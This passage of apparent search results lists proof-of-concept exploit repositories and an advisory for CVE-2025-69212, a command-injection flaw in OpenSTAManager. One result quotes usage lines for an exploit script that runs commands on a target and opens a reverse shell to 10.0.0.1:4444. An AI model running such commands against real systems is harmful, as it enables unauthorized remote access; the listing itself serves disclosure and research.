erson/CVE-2025-69212-PoC\n [link] https://github.com/BridgerAlderson/CVE-2025-69212-PoC\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - c0gnit00/CVE-2026-69212: Python poc, exploit for CVE-2025-69212 · GitHub\n [description] Proof-of-concept exploit for CVE-2025-69212, an OS Command Injection vulnerability in OpenSTAManager <= 2.9.8 that allows an authenticated attacker to achieve Remote Code Execution via a maliciously crafted ZIP file upload.\n [link] https://github.com/c0gnit00/CVE-2026-69212\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - jonathan-corbin/CVE-2025-69212-Authenticated-RCE-PoC: Automated PoC for CVE-2025-69212 - OpenSTAManager <=2.9.8 authenticated RCE · GitHub\n [description] ./exploit.py -u http://target -l USER -p PASS -c 'id' # single command ./exploit.py -u http://target -l USER -p PASS -i # interactive ./exploit.py -u http://target -l USER -p PASS -s 10.0.0.1 -P 4444 # reverse shell · --id-module/--id-plugin default to 14/19 (single-file importer); override if your install differs. -c/-i stage output in --webroot (default /var/www/html/openstamanager). ... Vulnerability discovered and disclosed by Łukasz Rybak (GHSA-25fp-8w8p-mx36).\n [link] https://github.com/jonathan-corbin/CVE-2025-69212-Authenticated-RCE-PoC\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2025-69212 - High Vulnerability - TheHackerWire\n [description] June 17, 2026 - CVE-2025-69212 is a High severity vulnerability (CVSS 8.8). OpenSTAManager is an open source management software for technical assistance and invoicing. In 2.9.8 and earlier, a critical OS Command...\n [link] https://www.thehackerwire.com/vulnerability/CVE-2025-69212/\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2025-69212 / devcode / 8.8 / exploit + patch\n [description] CVE-2025-69212 PoC - OpenSTAManager P7M Command Injection RCE Exploit Proof of Concept PoC exploit for CVE-2025-69212, an authenticated OS command injection leading to remote code execution RCE in OpenSTAManager = 2.9.8.\n [